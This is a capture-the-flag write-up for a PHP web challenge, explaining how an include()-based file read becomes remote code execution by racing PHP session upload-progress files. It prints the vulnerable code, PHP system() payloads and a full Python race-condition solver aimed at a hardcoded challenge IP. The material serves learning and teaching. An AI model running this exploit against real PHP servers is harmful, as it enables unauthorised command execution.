---
title: "I Hate PHP"
description: "CTF WEB challenge"
date: 2026-03-25T18:49:31+02:00
lastmod: 2026-03-25T18:49:31+02:00
tags:
  - CTF
  - walkthrough
  - web
categories:
  - writeup
cover: "covers/i_hate_php.png"
draft: false
---

`I Hate PHP` looks like a restricted LFI at first, but the bug is stronger than that because the app uses `include()`. Once I found a writable file under an allowed path, it turned into RCE.

<!--more-->

## code

```php
<?php
$file = $_GET['file'] ?? null;
$roots = ['/proc', '/etc', '/tmp', '/var'];

if ($file && str_starts_with($file, 'file://')) {
    $path = parse_url($file, PHP_URL_PATH);
    $real = is_string($path) ? @realpath($path) : false;
    if ($real !== false) {
        foreach ($roots as $root) {
            if ($real === $root || str_starts_with($real, $root . '/')) {
                include($real);
                exit;
            }
        }
    }
}

highlight_file(__FILE__);
```

The filter is annoying, but the important mistake is `include()`. If I can make PHP include a file that contains `<?php ... ?>`, I win.

## first step

My first move was reading files under `/proc`, since that path is allowed.

The two files that mattered were:

- `/proc/self/cmdline`
- `/proc/self/environ`

From `/proc/self/cmdline` I got:

```text
php -d session.upload_progress.enabled=On -d session.save_path=/var/lib/php/sessions -S 0.0.0.0:8000 -t /var/www/html
```

That told me two things immediately:

- upload progress is enabled
- PHP sessions are stored in `/var/lib/php/sessions`

From `/proc/self/environ` I got:

```text
PHP_CLI_SERVER_WORKERS=4
```

That was the second big clue. The built-in PHP server is running with 4 workers, so two requests can overlap. That makes a race condition practical.

## exploit idea

The path to RCE is:

1. use upload progress to write attacker-controlled data into a session file
2. include that session file from `/var/lib/php/sessions`

When a multipart upload contains the field `PHP_SESSION_UPLOAD_PROGRESS`, PHP stores progress data in the current session. For a session id like `abc123`, the file is:

```text
/var/lib/php/sessions/sess_abc123
```

Since `/var` is allowed by the challenge, I can make the app include that file:

```text
/?file=file:///var/lib/php/sessions/sess_abc123
```

The trick is to put PHP code inside the progress value itself:

```php
<?php echo "__OUT__"; system($_GET["x"] ?? "/readflag"); echo "__END__"; ?>
```

That payload ends up inside the session file. The file is not a normal `.php` file, but that does not matter. `include()` will still parse it, and once PHP hits `<?php ... ?>`, the code runs.

## why this is a race

Upload progress data does not stay there forever. PHP keeps updating it while the upload is in progress, then cleans it up when the request finishes.

So the solve is basically:

- start a large upload to keep the session file alive
- hammer the session file with `include()` requests from another worker

If one of those requests lands before cleanup, the payload executes.

That is why `PHP_CLI_SERVER_WORKERS=4` mattered so much.

## request flow

The upload request sends:

- a chosen `PHPSESSID`
- a `PHP_SESSION_UPLOAD_PROGRESS` field containing the PHP payload
- a large file so the request stays open long enough

At the same time, another thread keeps requesting:

```text
/?file=file:///var/lib/php/sessions/sess_<sid>&x=/readflag
```

If the race hits, the session file gets included and this runs:

```php
system($_GET["x"] ?? "/readflag");
```

I wrapped the output with markers so the solver could tell when it actually worked:

```php
<?php echo "__OUT_<sid>__"; system($_GET["x"] ?? "/readflag"); echo "__END_<sid>__"; ?>
```

## solver

The final solver is in `solvephp.py`. It is small and fixed to the challenge URL.

What it does:

1. generate a fresh session id
2. start a multipart upload with the PHP payload in `PHP_SESSION_UPLOAD_PROGRESS`
3. send parallel requests that include `sess_<sid>`
4. stop once it sees the output markers

```python
import requests
import threading
import sys

# Target Configuration
URL = "http://178.62.202.60:8888/"
SESS_ID = "pwned"

SESSION_FILE = f"/var/lib/php/sessions/sess_{SESS_ID}"
PAYLOAD_PATH = f"file://{SESSION_FILE}"

COMMAND = "/readflag;"
PHP_PAYLOAD = f"<?php echo '---START---'; system('{COMMAND}'); echo '---END---'; ?>"

def upload_thread():

    padding = "A" * 500000
    data = {'PHP_SESSION_UPLOAD_PROGRESS': PHP_PAYLOAD}
    files = {'file': ('dummy.txt', padding)}
    cookies = {'PHPSESSID': SESS_ID}

    while True:
        try:
            requests.post(URL, data=data, files=files, cookies=cookies)
        except:
            pass

def lfi_thread():
    params = {'file': PAYLOAD_PATH}
    while True:
        try:
            r = requests.get(URL, params=params)
            if "---START---" in r.text:
                print("\n[+] RACE WON!")
                content = r.text.split("---START---")[1].split("---END---")[0]
                print(content.strip())
                sys.exit(0)
        except:
            pass

print(f"[*] Starting race against {URL}")
print(f"[*] Targeting session file: {SESSION_FILE}")


for _ in range(20):
    threading.Thread(target=upload_thread, daemon=True).start()
for _ in range(20):
    threading.Thread(target=lfi_thread, daemon=True).start()
import time
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[-] Stopped.")
```

Run it with:

```bash
python3 solvephp.py
```


## flag

```text
CATF{7H3_M057_7H1NG_1_H473_4B0U7_PHP_15_H0W_UNPR3D1C74BL3_17_C4N_B3}
```
